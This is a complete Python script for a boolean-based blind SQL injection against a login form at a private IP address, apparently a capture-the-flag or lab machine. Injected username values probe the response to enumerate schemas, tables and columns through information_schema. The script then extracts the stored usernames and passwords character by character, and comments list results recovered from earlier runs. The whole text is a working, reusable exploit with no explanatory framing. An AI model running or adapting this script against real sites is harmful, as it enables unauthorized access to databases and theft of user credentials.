#!/usr/bin/env python3

import requests

target_url = "http://10.10.125.176/index.html"
valid_username = "jxf"

def send_payload(data):
	r = requests.post(target_url, data=data)
	if "Invalid username or password" not in r.text:
		return True
	return False

def get_count(column, database_table, sql_filter = ""):
	for i in range(1, 10):
		if send_payload({"username":f"{valid_username}' and (select count({column}) from {database_table} {sql_filter})={str(i)}-- -","password":"asd"}):
			return i
	return 0

def get_value_len(index, column, database_table, sql_filter = ""):
	for i in range(1, 30):
		if send_payload({"username":f"{valid_username}' and length((select {column} from {database_table} {sql_filter} limit {str(index)}, 1))={str(i)}-- -","password":"asd"}):
			return i
	return 0

def extract_values(column, database_table, sql_filter = ""):
	values = []
	value_row_count = get_count(column, database_table, sql_filter)
	for value_row_index in range(value_row_count):
		value = ""
		value_len = get_value_len(value_row_index, column, database_table, sql_filter)
		for char_index in range(value_len):
			for char_ord in range(32,127): # Ascii values for non-special characters. 
				if send_payload({"username":f"{valid_username}' and ord(substr((select {column} from {database_table} {sql_filter} limit {str(value_row_index)},1),{str(char_index+1)},1))={str(char_ord)}-- -","password":"asd"}):
					value += chr(char_ord)
		values.append(value)
	return values

# To extract database names
# print(extract_values("schema_name", "information_schema.schemata"))
# ['information_schema', 'performance_schema', 'mywebsite', 'devsite']

# To extract table names for mywebsite database
# print(extract_values("table_name", "information_schema.tables", "where table_schema=\"mywebsite\""))
# ['siteusers']

# To extract columns for siteusers table on mywebsite database
# print(extract_values("column_name", "information_schema.columns", "where table_name=\"siteusers\" and table_schema=\"mywebsite\""))
# ['created_at', 'id', 'password', 'username']

# To extract usernames from siteusers table
print(extract_values("username", "mywebsite.siteusers", f"where username!=\"{valid_username}\""))
# To extract passwords from siteusers table
print(extract_values("password", "mywebsite.siteusers", f"where username!=\"{valid_username}\""))
